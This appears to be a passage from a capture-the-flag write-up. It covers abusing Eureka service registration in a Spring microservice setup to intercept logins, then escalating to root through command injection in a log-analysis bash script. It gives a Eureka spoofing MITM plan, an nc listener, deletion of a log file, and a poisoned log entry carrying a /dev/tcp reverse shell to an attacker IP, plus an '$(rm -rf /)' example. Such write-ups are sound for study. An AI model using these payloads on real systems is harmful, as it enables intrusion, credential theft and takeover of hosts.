So what is happening here ?

EUREKA PURPOSE:

Eureka’s main purpose is service discovery—it helps microservices find and communicate with each other dynamically without hard-coded URLs.

  1. Service Registration

    • When a microservice (e.g., USER-MANAGEMENT-SERVICE) starts, it registers itself with Eureka, saying:
      “Hey, I’m USER-MANAGEMENT-SERVICE, and I’m running at localhost:8081.”
    • Eureka stores this information in its registry.

  2. Service Discovery

    • If another service (e.g., APP-GATEWAY) needs to call USER-MANAGEMENT-SERVICE, it asks Eureka: “Where can I find USER-MANAGEMENT-SERVICE?”
    • Eureka replies: “It’s at localhost:8081 and is UP.”

  3. Load Balancing (with Ribbon)

    • If multiple instances of a service (e.g., 3 copies of FURNI) are registered, Eureka helps distribute requests across them.

  4. Health Monitoring

    • Eureka periodically checks if registered services are alive (UP/DOWN status).
    • If a service crashes (DOWN), Eureka removes it from the registry, preventing failed requests.

Why Eureka is Needed:

  • Dynamic Scaling: In cloud environments, services may start/stop or scale up/down. Hardcoding IPs/ports would break the system.

  • Resilience: If a service fails, Eureka ensures traffic is routed only to healthy instances.

  • Decoupling: Services don’t need to know each other’s locations upfront—they just ask Eureka.

How can we abuse it ?

Eureka Server Spoofing:

  • If an attacker deploys a fake Eureka server, microservices might register with it (due to misconfiguration). The attacker could then:

    • Redirect traffic to malicious endpoints.

    • Log sensitive API requests/responses.

THE ATTACK SCENARIO

lb://USER-MANAGEMENT-SERVICE makes it MITM vulnerable:

  1. How the Load Balancer Works

    • When APP-GATEWAY routes a request to lb://USER-MANAGEMENT-SERVICE/login, it:

      1. Asks Eureka:“Give me the IP/port of USER-MANAGEMENT-SERVICE.”

      2. Eureka responds with the registered instance (e.g., localhost:8081).

      3. The gateway forwards the request without validating the target’s identity.

  2. The MITM Attack Scenario

    • An attacker can register a fake service with Eureka (e.g., malicious-host:8081).

    • Eureka doesn’t authenticate services by default, so it accepts the fake registration.

    • Now, whenAPP-GATEWAY asks Eureka for USER-MANAGEMENT-SERVICE, it gets the attacker’s IP instead of the real one.

    • All/login requests are transparently routed to the attacker’s server, which can:

      • Steal credentials (MITM).
      • Modify responses (e.g., inject malicious JavaScript).

  3. Why This Happens

    • No TLS: If communication is over HTTP, the attacker can read/modify traffic.

    • No Service Authentication: Eureka trusts any service that registers.

    • lb:// Trusts Eureka Blindly: The load balancer assumes Eureka’s response is legitimate.

OUR GOAL:

If we replace a real service (e.g., USER-MANAGEMENT-SERVICE) with our fake server, all traffic that would normally go to the real one will now go to us. Then the authentication traffic should become:

Login Form → APP-GATEWAY → USER-MANAGEMENT-SERVICE (hijacked) → OUR SERVER

#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"

If we check the analyze_http_statuses() function we can see there is unsanitized input handling and potential command injection vulnerabilities.

1. Command Injection Risk:

![[Pasted image 20250429114119.png]]

  • echo "$line" interprets shell metacharacters in the input.

  • If $line contains something like $(rm -rf /), it will execute the command instead of treating it as text.

2. Unvalidated Integer Comparison:

![[Pasted image 20250429121049.png]]

  • -eq is a numeric comparison.
  • If $code is NOT a number, bash will evaluate it
  • If $code is something like a[$(id)], then bash will expand the $(...) before comparison.

a can be treated like a variable name, where a[...] can be treated as a kind of array access (even if a doesn't exist, Bash doesn't care initially during parsing). So Bash parses inside the [ ... ], and executes the $(...).

Since we know the script has a command injection vulnerability. Its time to verify if the script is running as root or else. For that we need to monitor the file system. Hence we will be using Pspy64 for this purpose.

  • If log rotation isn’t strict, attackers can append malicious entries.

13. CHECK EXECUTION FORMAT OF THE LOG:

In order to craft the payload we need to know what is the format of the log which the script executes every time:

tail /var/www/web/cloud-gateway/log/application.log -n3

The log_analyse.sh script is likely parsing logs in this format:

  • It searches for HTTP.*Status: (grep "HTTP.*Status: ").
  • Then extracts the status code (grep -oP 'Status: \K.*').

OUR GOAL:

  • Check if the current user have the permission to modify or delete the application.log
  • If there is a permission to delete the application.log we can replace our malicious one with the same name as application.log and can obtain the root.

2. Open the Reverse Shell:

sudo rlwrap nc -nlvp 80

3. Remove the application.log from the directory:

rm -f /var/www/web/user-management-service/log/application.log

4. Create the malicious application.log on the target directly for root:

echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.16.91/80 0>&1)]' > /var/www/web/user-management-service/log/application.log

Why This Worked ?

  • The x[$(...)] structure **forces Bash to evaluate the command inside $() ** before arithmetic comparison (-eq).

  • Here’s what happens step-by-step:

    1. The script extracts x[$(/bin/bash -i >& /dev/tcp/10.10.16.91/80 0>&1)] as the “status code.”
    2. When the script runs [[ "$code" -eq "some_number" ]], Bash:
      First tries to evaluate x[$(...)] as an arithmetic expression.
      • Sincex[ is not a valid number Bash executes the command substitution $(...) as a fallback.
      • The reverse shell triggers before the comparison fails.
